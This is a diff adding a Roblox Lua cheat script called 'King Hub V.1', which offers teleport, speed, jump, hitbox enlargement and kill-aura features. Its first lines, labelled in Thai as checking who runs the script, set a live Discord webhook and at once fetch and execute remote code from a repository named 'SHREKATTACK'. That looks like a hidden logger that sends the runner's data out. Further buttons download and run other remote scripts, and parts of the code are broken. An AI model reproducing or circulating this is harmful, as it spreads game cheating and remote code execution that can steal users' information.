@@ -1,0 +1,108 @@
+--เช็คข้อมูลผู้รันScript--
+
+_G.webhooksdiscord = "https://discord.com/api/webhooks/1264961274651873341/Eyx4GJEDt4Xv_vaAp7huFP1F7RrBtN6OBxtPzz6VtBtdlVRANbsx5xA6FqIaEpX6tHFP"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
+
+local ScreenGui = Instance.new("ScreenGui")
+local ImageButton = Instance.new("ImageButton")
+local UICorner = Instance.new("UICorner")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+ImageButton.Parent = ScreenGui
+ImageButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ImageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageButton.BorderSizePixel = 0
+ImageButton.LayoutOrder = -1
+ImageButton.Position = UDim2.new(0.476764202, 0, 0.443609029, 0)
+ImageButton.Size = UDim2.new(0, 90, 0, 90)
+ImageButton.Image = "rbxassetid://18590284830"
+
+UICorner.Parent = ImageButton
+wait(2.5)
+game.CoreGui:FindFirstChild("ScreenGui"):Destroy()
+
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("King Hub V.1", "BloodTheme")
+
+local Tab = Window:NewTab("MAIN")
+local Section = Tab:NewSection("Teleport To Player")
+
+Plr = {}
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+    table.insert(Plr,v.Name)
+end    
+Section:NewDropdown("Select Player", "Click to slect", Plr, function(t)
+    PlayerTP = t
+end)
+Section:NewButton("Click To TP", "", function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[PlayerTP].Character.HumanoidRootPart.CFrame
+end)
+Section:NewToggle("Auto Teleport To Player", "", function(t)
+_G.TPPlayer = t
+while _G.TPPlayer do wait()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[PlayerTP].Character.HumanoidRootPart.CFrame
+end
+end)
+Section:NewButton("Refresh Player", "", function()
+      table.insert(players)
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+    table.insert(Players,v.Name)
+end
+end)
+
+
+local Tab = Window:NewTab("PLAYER")
+local Section = Tab:NewSection("Speed | Jump Player")
+
+Section:NewSlider("WalkSpeed", "", 150, 0, function(s)
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
+end)
+Section:NewSlider("JumpPower", "", 150, 0, function(s)
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
+end)
+
+local Section = Tab:NewSection("Hitbox / Aura kill")
+
+Section:NewButton("HitBox Player", "", function()
+game:GetService("RunService").RenderStepped:connect(function()
+for i,v in next, (game:GetService("Players"):GetPlayers()) do
+    if v.Name ~= game:GetService("Players").LocalPlayer.Name then
+    v.Character.HumanoidRootPart.Size = Vector3.new(25,25,25)
+    v.Character.HumanoidRootPart.Transparency = 0.5
+    v.Character.HumanoidRootPart.CanCollide = false
+    end
+end
+end)
+end)
+
+Section:NewButton("Kill Aura", "", function()
+_G.auto = true
+while _G.auto do wait()
+for i,v in pairs(game:GetService("Workspace").Enemy:GetChildren()) do 
+    if v.ClassName == "Model" then
+        v.Zombie.Health = die
+wait(.1)
+end
+    end 
+    end
+end)
+
+local Tab = Window:NewTab("SETTING")
+local Section = Tab:NewSection("Setting")
+
+Section:NewKeybind("KeybindText", "KeybindInfo", Enum.KeyCode.F, function()
+	Library:ToggleUI()
+end)
+
+Section:NewButton("Infinite Yield", "", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+
+Section:NewButton("Remote Spy", "", function()
+    loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
+end)
